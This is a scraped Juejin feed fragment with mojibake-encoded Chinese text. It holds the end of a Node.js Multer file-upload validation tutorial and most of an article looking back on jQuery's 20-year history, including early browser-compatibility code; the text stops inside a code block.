<pre><code class="hljs language-scss" lang="scss">constÂ pathÂ =Â <span class="hljs-built_in">require</span>('path');

functionÂ <span class="hljs-built_in">checkFileType</span>(file)Â {
Â Â constÂ extÂ =Â path<span class="hljs-selector-class">.extname</span>(file.originalname)<span class="hljs-selector-class">.toLowerCase</span>();
Â Â returnÂ <span class="hljs-selector-attr">[<span class="hljs-string">'.jpg'</span>,Â <span class="hljs-string">'.png'</span>,Â <span class="hljs-string">'.pdf'</span>]</span><span class="hljs-selector-class">.includes</span>(ext);
}
</code></pre>
<p>åœ¨Â <code>fileFilter</code>Â ä¸­åŒæ—¶æ ¡éªŒ MIME å’Œæ‰©å±•åï¼Œå¯è¿›ä¸€æ­¥å¢å¼ºå®‰å…¨æ€§ã€‚</p>
<hr/>
<h2 data-id="heading-8">äº”ã€æ–‡ä»¶å¤§å°ä¸æ•°é‡é™åˆ¶</h2>
<h3 data-id="heading-9">1ï¸âƒ£ å•æ–‡ä»¶å¤§å°é™åˆ¶</h3>
<pre><code class="hljs language-ini" lang="ini">constÂ <span class="hljs-attr">upload</span>Â =Â multer({
Â Â storage,
Â Â limits:Â {
Â Â Â Â fileSize:Â 2Â *Â 1024Â *Â 1024Â //Â 2MB
Â Â }
})<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-10">2ï¸âƒ£ å¤šæ–‡ä»¶æ€»æ•°é™åˆ¶</h3>
<p><code>upload.array('files', maxCount)</code>Â å¯é™åˆ¶æœ€å¤§æ–‡ä»¶æ•°ï¼š</p>
<pre><code class="hljs language-c" lang="c">upload.<span class="hljs-built_in">array</span>(<span class="hljs-string">'files'</span>,Â <span class="hljs-number">10</span>)
</code></pre>
<p>å½“è¶…å‡ºé™åˆ¶æ—¶ï¼ŒMulter ä¼šè‡ªåŠ¨æŠ›å‡ºé”™è¯¯ã€‚</p>
<hr/>
<h2 data-id="heading-11">å…­ã€ç»Ÿä¸€é”™è¯¯å¤„ç†æœºåˆ¶</h2>
<p>åœ¨æ–‡ä»¶ä¸Šä¼ åœºæ™¯ä¸­ï¼Œé”™è¯¯å¤„ç†å°¤ä¸ºé‡è¦ï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>â€¢ æ–‡ä»¶è¿‡å¤§</li>
<li>â€¢ æ–‡ä»¶ç±»å‹ä¸åˆæ³•</li>
<li>â€¢ ä¸Šä¼ æ•°é‡è¶…é™</li>
</ul>
<p>ç¤ºä¾‹ç»Ÿä¸€å¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/upload'</span>,Â <span class="hljs-function">(<span class="hljs-params">req,Â res</span>)Â =&gt;</span>Â {
Â Â upload.<span class="hljs-title function_">array</span>(<span class="hljs-string">'files'</span>,Â <span class="hljs-number">5</span>)(req,Â res,Â <span class="hljs-function"><span class="hljs-params">err</span>Â =&gt;</span>Â {
Â Â Â Â <span class="hljs-keyword">if</span>Â (err)Â {
Â Â Â Â Â Â <span class="hljs-keyword">return</span>Â res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>({Â <span class="hljs-attr">error</span>:Â err.<span class="hljs-property">message</span>Â });
Â Â Â Â }
Â Â Â Â res.<span class="hljs-title function_">json</span>({Â <span class="hljs-attr">message</span>:Â <span class="hljs-string">'ä¸Šä¼ æˆåŠŸ'</span>Â });
Â Â });
});
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç»™å‰ç«¯æ˜ç¡®çš„é”™è¯¯æç¤ºã€‚</p>
<hr/>
<h2 data-id="heading-12">ä¸ƒã€ä¸Šä¼ åçš„æ–‡ä»¶ä¿¡æ¯å¤„ç†</h2>
<p>æˆåŠŸä¸Šä¼ åï¼Œé€šå¸¸éœ€è¦ï¼š</p>
<ul>
<li>â€¢ å°†æ–‡ä»¶ä¿¡æ¯å†™å…¥æ•°æ®åº“</li>
<li>â€¢ è¿”å›æ–‡ä»¶è®¿é—®åœ°å€</li>
<li>â€¢ ç»‘å®šä¸šåŠ¡æ•°æ®ï¼ˆå¦‚æ–‡ç« ã€ç”¨æˆ·ï¼‰</li>
</ul>
<p>ç¤ºä¾‹è¿”å›ç»“æ„ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
Â Â <span class="hljs-attr">"filename"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"1674039200-abc123.png"</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"size"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-number">34567</span><span class="hljs-punctuation">,</span>
Â Â <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span>Â <span class="hljs-string">"/uploads/1674039200-abc123.png"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å‰ç«¯å¯ç›´æ¥ç”¨äºå±•ç¤ºæˆ–åç»­å¤„ç†ã€‚</p>
<hr/>
<h2 data-id="heading-13">å…«ã€æ€§èƒ½ä¸å®‰å…¨ä¼˜åŒ–å»ºè®®</h2>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¤šæ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿè¿˜éœ€è¦è¿›ä¸€æ­¥ä¼˜åŒ–ï¼š</p>
<p>1ï¸âƒ£Â <strong>é˜²æ­¢é‡å¤ä¸Šä¼ </strong></p>
<ul>
<li>â€¢ è®¡ç®—æ–‡ä»¶ Hashï¼ˆMD5 / SHA1ï¼‰</li>
<li>â€¢ ç›¸åŒæ–‡ä»¶ç›´æ¥å¤ç”¨</li>
</ul>
<p>2ï¸âƒ£Â <strong>å¤§æ–‡ä»¶æ‹†åˆ†ä¸Šä¼ </strong></p>
<ul>
<li>â€¢ åˆ†ç‰‡ä¸Šä¼ </li>
<li>â€¢ æ–­ç‚¹ç»­ä¼ </li>
</ul>
<p>3ï¸âƒ£Â <strong>ä¸Šä¼ ç›®å½•éš”ç¦»</strong></p>
<ul>
<li>â€¢ ç¦æ­¢æ‰§è¡Œæƒé™</li>
<li>â€¢ é˜²æ­¢æ–‡ä»¶ç›´æ¥è¢«å½“ä½œè„šæœ¬æ‰§è¡Œ</li>
</ul>
<p>4ï¸âƒ£Â <strong>CDN / å¯¹è±¡å­˜å‚¨</strong></p>
<ul>
<li>â€¢ é˜¿é‡Œäº‘ OSSã€è…¾è®¯äº‘ COSã€S3</li>
<li>â€¢ å‡è½»æœåŠ¡å™¨å‹åŠ›</li>
</ul>
<hr/>
<h2 data-id="heading-14">ä¹ã€æ€»ç»“</h2>
<p>å¤šæ–‡ä»¶ä¸Šä¼ ä¸éªŒè¯æ˜¯ Node.js åç«¯å¼€å‘ä¸­çš„é«˜é¢‘éœ€æ±‚ï¼Œä¹Ÿæ˜¯å®‰å…¨é£é™©è¾ƒé«˜çš„æ¨¡å—ä¹‹ä¸€ã€‚é€šè¿‡åˆç†ä½¿ç”¨ Multer ä¸­é—´ä»¶ã€ä¸¥æ ¼çš„æ–‡ä»¶ç±»å‹ä¸å¤§å°æ ¡éªŒï¼Œä»¥åŠå®Œå–„çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå¯ä»¥æ„å»ºä¸€ä¸ª<strong>å®‰å…¨ã€ç¨³å®šã€å¯æ‰©å±•çš„æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿ</strong>ã€‚</p>
<p>åœ¨ã€ŠNode.js ç¼–ç¨‹å®æˆ˜ã€‹ç³»åˆ—ä¸­ï¼Œæ–‡ä»¶ä¸Šä¼ æ¨¡å—ä¸ºåç»­çš„æ–‡ä»¶å¤„ç†ã€èµ„æºç®¡ç†ã€ä¸šåŠ¡ç»‘å®šæ‰“ä¸‹äº†åšå®åŸºç¡€ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½]]></title>    <link>https://juejin.cn/post/7597259271110246440</link>    <guid>https://juejin.cn/post/7597259271110246440</guid>    <pubDate>2026-01-20T10:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597259271110246440" data-draft-id="7597243334176882728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,jQuery"/> <meta itemprop="datePublished" content="2026-01-20T10:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:53:20.000Z" title="Tue Jan 20 2026 10:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2006 å¹´ 1 æœˆ 14 æ—¥ï¼ŒJohn Resig å‘å¸ƒäº†åä¸º jQuery çš„ JavaScript åº“ã€‚</p>
<p><strong>è‡³ä»Šå·²ç»è¿‡å»äº† 20 å¹´ï¼</strong></p>
<p>20 å‘¨å¹´ä¹‹é™…ï¼ŒjQuery 4.0 æ­£å¼å‘å¸ƒäº†ï¼</p>
<p>æ˜¯çš„ï¼Œå°±æ˜¯é‚£ä¸ªè¢«æ— æ•°äººå®£å¸ƒâ€œå·²æ­»â€çš„ jQueryï¼Œç»è¿‡ 10 å¹´çš„ç­‰å¾…åè¿æ¥äº†é‡å¤§æ›´æ–°ã€‚</p>
<p>æ›´è®©äººæ„æƒ³ä¸åˆ°çš„æ˜¯ï¼Œæ ¹æ® W3Techs çš„æ•°æ®ï¼Œ<strong>jQuery ä»ç„¶è¢«å…¨çƒ 78% çš„ç½‘ç«™ä½¿ç”¨</strong>ã€‚</p>
<p>è¿™ä¸ªæ•°å­—æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p>åœ¨ Reactã€Vueã€Angular ç­‰ç°ä»£æ¡†æ¶æ¨ªè¡Œçš„ä»Šå¤©ï¼Œé‚£ä¸ªæ›¾ç»è¢«æˆ‘ä»¬å«Œå¼ƒâ€œè€æ‰ç‰™â€çš„ jQueryï¼Œä¾ç„¶åœ¨äº’è”ç½‘çš„è§’è½é‡Œé»˜é»˜å‘å…‰å‘çƒ­ã€‚</p>
<p>ä» 2006 å¹´ John Resig åœ¨ BarCampNYC å¤§ä¼šä¸Šé¦–æ¬¡å‘å¸ƒï¼Œåˆ°ä»Šå¤© 4.0 ç‰ˆæœ¬çš„ç°ä»£åŒ–é‡ç”Ÿï¼ŒjQuery èµ°è¿‡äº†æ•´æ•´ 20 å¹´ã€‚</p>
<p><strong>å®ƒä¸ä»…æ˜¯ä¸€ä¸ª JavaScript åº“ï¼Œæ›´æ˜¯ä¸€ä¸ªæ—¶ä»£çš„ç¼©å½±ï¼Œè§è¯äº†å‰ç«¯æŠ€æœ¯ä»æ··æ²Œåˆ°ç¹è£çš„å®Œæ•´å†ç¨‹ã€‚</strong></p>
<p>æœ¬ç¯‡è®©æˆ‘ä»¬ä¸€èµ·å›é¡¾ jQuery çš„ 20 å¹´ï¼Œè§è¯å®ƒçš„è¾‰ç…Œä¸æ²¡è½ã€‚</p>
<h2 data-id="heading-0">1. æ··æ²Œæ—¶ä»£</h2>
<p>å›æœ› 2006 å¹´ï¼Œå½¼æ—¶æ­£å€¼ç¬¬ä¸€æ¬¡æµè§ˆå™¨æˆ˜äº‰çš„å°¾å£°ï¼Œå¾®è½¯ IE ä¸ç½‘æ™¯ Navigator åˆšåˆšæ‰“å®Œä»—ï¼Œä½†é—ç•™ä¸‹æ¥çš„å…¼å®¹æ€§é—®é¢˜å´è®©æ— æ•°å‰ç«¯å¼€å‘è€…å¤´ç–¼ä¸å·²ã€‚</p>
<p>å½“æ—¶å¼€å‘è€…éœ€è¦é¢å¯¹å„ç§æµè§ˆå™¨çš„â€œå¥‡æŠ€æ·«å·§â€ï¼Œå…‰æ˜¯ä¸€ä¸ªäº‹ä»¶ç»‘å®šå°±è¦å†™ä¸€å¤§ä¸²å…¼å®¹ä»£ç ã€‚</p>
<p>æ¥çœ‹çœ‹è¿™æ®µæ—©æœŸçš„ jQuery æºç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¦‚æœä½¿ç”¨Mozilla</span>
<span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"mozilla"</span> || jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"opera"</span>) {
    jQuery.<span class="hljs-property">event</span>.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">document</span>, <span class="hljs-string">"DOMContentLoaded"</span>, jQuery.<span class="hljs-property">ready</span>);
}
<span class="hljs-comment">// å¦‚æœä½¿ç”¨IE</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"msie"</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">"&lt;scr"</span> +=<span class="hljs-string">""</span> <span class="hljs-string">"ipt="</span><span class="hljs-string">" id="</span>__ie_init<span class="hljs-string">" defer="</span><span class="hljs-literal">true</span><span class="hljs-string">" "</span>=<span class="hljs-string">""</span> <span class="hljs-string">"src="</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">void</span>(<span class="hljs-number">0</span>)<span class="hljs-string">"&gt;&lt;\/script&gt;"</span>);
    <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"__ie_init"</span>);
    script.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) jQuery.<span class="hljs-title function_">ready</span>();
    };
}
<span class="hljs-comment">// å¦‚æœä½¿ç”¨Safari</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"safari"</span>) {
    jQuery.<span class="hljs-property">safariTimer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"loaded"</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) {
            <span class="hljs-built_in">clearInterval</span>(jQuery.<span class="hljs-property">safariTimer</span>);
            jQuery.<span class="hljs-title function_">ready</span>();
        }
    }, <span class="hljs-number">10</span>);
}
&lt;/scr<span class="hljs-string">"&gt;

</span></code></pre>
<p>çœ‹åˆ°æ²¡ï¼Ÿä»…ä»…æ˜¯å¤„ç†é¡µé¢åŠ è½½äº‹ä»¶å°±è¦å†™è¿™ä¹ˆå¤šå…¼å®¹ä»£ç ï¼è¿™åœ¨ä»Šå¤©æ˜¯éš¾ä»¥æƒ³è±¡çš„ã€‚</p>
<h2 data-id="heading-1">2. æ¨ªç©ºå‡ºä¸–</h2>
<p>å°±åœ¨è¿™æ—¶ï¼ŒjQuery æ¨ªç©ºå‡ºä¸–ï¼Œå½»åº•æ”¹å˜äº†æ¸¸æˆè§„åˆ™ã€‚</p>
<p>John Resig æå‡ºäº†ä¸€ä¸ªç®€å•è€Œä¼˜é›…çš„ç†å¿µï¼š</p>
<blockquote>
<p><strong>Write Lessï¼ŒDo More</strong></p>
</blockquote>
<p>jQuery é€šè¿‡ç²¾ç®€å¸¸è§çš„é‡å¤æ€§ä»»åŠ¡ï¼Œå»é™¤æ‰€æœ‰ä¸å¿…è¦çš„æ ‡è®°ï¼Œä½¿ä»£ç ç®€æ´ã€é«˜æ•ˆä¸”æ˜“äºç†è§£ï¼Œä»è€Œå®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>
<p>jQuery å¸¦æ¥äº†ä¸¤å¤§é©å‘½æ€§æ”¹å˜ï¼š</p>
<ol>
<li><strong>å¼ºå¤§çš„é€‰æ‹©å™¨å¼•æ“</strong>ï¼šä¸å†å±€é™äºç®€å•çš„ ID å’Œç±»é€‰æ‹©ï¼Œå¯ä»¥è¿›è¡Œå¤æ‚çš„å…³ç³»é€‰æ‹©</li>
<li><strong>ä¼˜é›…çš„ API è®¾è®¡</strong>ï¼šé“¾å¼æ“ä½œè®©ä»£ç æ—¢ç®€æ´åˆæ˜“è¯»</li>
</ol>
<p>çœ‹çœ‹è¿™ä¸ªå¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ ç»ŸDOMæ“ä½œ</span>
<span class="hljs-keyword">var</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"contacts"</span>).<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"ul"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">"people"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">var</span> items = elements[i].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"li"</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; items.<span class="hljs-property">length</span>; j++) {
    <span class="hljs-comment">// æ“ä½œæ¯ä¸ªitem</span>
  }
}

<span class="hljs-comment">// jQueryæ–¹å¼</span>
$(<span class="hljs-string">"#contacts ul.people li"</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// æ“ä½œæ¯ä¸ªitem</span>
});
</code></pre>
<p>å·®è·ä¸€ç›®äº†ç„¶ï¼</p>
<p>jQuery çš„å‡ºç°è®©å‰ç«¯å¼€å‘å˜å¾—å¦‚æ­¤ä¼˜é›…ï¼Œä»¥è‡³äºè¿…é€Ÿåœ¨å¼€å‘è€…ç¾¤ä½“ä¸­ä¼ æ’­å¼€æ¥ã€‚</p>
<h2 data-id="heading-2">3. è¾‰ç…Œå²æœˆ</h2>
<p>éšç€ jQuery çš„æ™®åŠï¼Œä¸€ä¸ªåºå¤§çš„æ’ä»¶ç”Ÿæ€è¿…é€Ÿå»ºç«‹èµ·æ¥ã€‚</p>
<p>ä»æ—¥æœŸé€‰æ‹©å™¨åˆ°è½®æ’­å›¾ï¼Œä»è¡¨å•éªŒè¯åˆ°åŠ¨ç”»æ•ˆæœï¼Œå‡ ä¹ä½ èƒ½æƒ³åˆ°çš„åŠŸèƒ½éƒ½æœ‰å¯¹åº”çš„ jQuery æ’ä»¶ã€‚</p>
<p>é‚£æ—¶å€™å‰ç«¯å¼€å‘çš„æ ‡å‡†æµç¨‹æ˜¯ï¼š</p>
<ol>
<li>ä¸‹è½½ jQuery æ ¸å¿ƒåº“</li>
<li>æœç´¢å¹¶ä¸‹è½½æ‰€éœ€çš„ jQuery æ’ä»¶</li>
<li>ç»„åˆè¿™äº›æ’ä»¶å®Œæˆé¡¹ç›®</li>
</ol>
<p>åŒæ—¶ï¼ŒjQuery çš„ç®¡ç†ä¹Ÿå˜å¾—æ­£å¼ã€‚</p>
<p>2011 å¹´ï¼ŒjQuery å›¢é˜Ÿæ­£å¼æˆç«‹äº† jQuery ç†äº‹ä¼šã€‚2012 å¹´ï¼ŒjQuery ç†äº‹ä¼šæˆç«‹äº† jQuery åŸºé‡‘ä¼šã€‚</p>
<h2 data-id="heading-3">4. å½±å“æ·±è¿œ</h2>
<p>jQuery çš„å½±å“åŠ›è¿œè¿œè¶…å‡ºäº†æŠ€æœ¯æœ¬èº«ï¼Œå®ƒæ¨åŠ¨äº†æ•´ä¸ªå‰ç«¯è¡Œä¸šçš„å‘å±•ï¼š</p>
<ul>
<li>**å¤§å¹…é™ä½äº†å‰ç«¯å¼€å‘çš„é—¨æ§›ï¼š**è®©æ›´å¤šçš„å¼€å‘è€…èƒ½å¤Ÿå‚ä¸åˆ°å‰ç«¯å¼€å‘ä¸­æ¥</li>
<li><strong>æå‡äº†å‰ç«¯å·¥ç¨‹å¸ˆçš„ç¤¾ä¼šåœ°ä½</strong>ï¼šè®©å‰ç«¯å¼€å‘å˜å¾—æ›´åŠ ä¸“ä¸šå’Œé‡è¦</li>
<li><strong>ä¿ƒè¿›äº†æµè§ˆå™¨å‚å•†çš„æ ‡å‡†åŒ–</strong>ï¼šjQuery çš„æˆåŠŸè¯æ˜äº†ç»Ÿä¸€ API çš„é‡è¦æ€§</li>
<li><strong>å‚¬ç”Ÿäº†ç°ä»£å‰ç«¯å·¥å…·é“¾</strong>ï¼šä¸ºåæ¥çš„æ¨¡å—åŒ–ã€æ„å»ºå·¥å…·å¥ å®šäº†åŸºç¡€</li>
</ul>
<p>ç”šè‡³è¿ jQuery çš„é€‰æ‹©å™¨å¼•æ“ Sizzle åæ¥éƒ½è¢«æå–å‡ºæ¥ï¼Œå½±å“äº†æ•´ä¸ªé€‰æ‹©å™¨æ ‡å‡†çš„å‘å±•ã€‚</p>
<h2 data-id="heading-4">5. ä»·å€¼åŠ¨æ‘‡</h2>
<p>jQuery ä¹‹æ‰€ä»¥èƒ½å¤Ÿå¿«é€Ÿæ™®åŠï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºæµè§ˆå™¨çš„â€œä¸äº‰æ°”â€ã€‚</p>
<p>è€Œå½“æµè§ˆå™¨å‚å•†å¼€å§‹è®¤çœŸå¯¹å¾…æ ‡å‡†åŒ–é—®é¢˜æ—¶ï¼ŒjQuery çš„æ ¸å¿ƒä»·å€¼å°±å¼€å§‹åŠ¨æ‘‡äº†ã€‚</p>
<p>2009 å¹´åï¼Œæµè§ˆå™¨æ ‡å‡†åŒ–è¿›ç¨‹å¤§å¹…åŠ é€Ÿï¼š</p>
<ul>
<li><code>querySelector</code>å’Œ<code>querySelectorAll</code>çš„å‡ºç°</li>
<li><code>classList</code> API çš„æ™®åŠ</li>
<li><code>fetch</code> API æ›¿ä»£ Ajax éœ€æ±‚</li>
<li>CSS3 åŠ¨ç”»æ›¿ä»£ JavaScript åŠ¨ç”»</li>
</ul>
<p>ç°ä»£æµè§ˆå™¨ API çš„å®Œå–„ï¼Œè®©å¾ˆå¤š jQuery åŠŸèƒ½éƒ½æœ‰äº†åŸç”Ÿæ›¿ä»£å“ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// jQueryæ–¹å¼</span>
$(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> $(<span class="hljs-string">"#box"</span>).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">"active"</span>));

<span class="hljs-comment">// åŸç”Ÿæ–¹å¼</span>
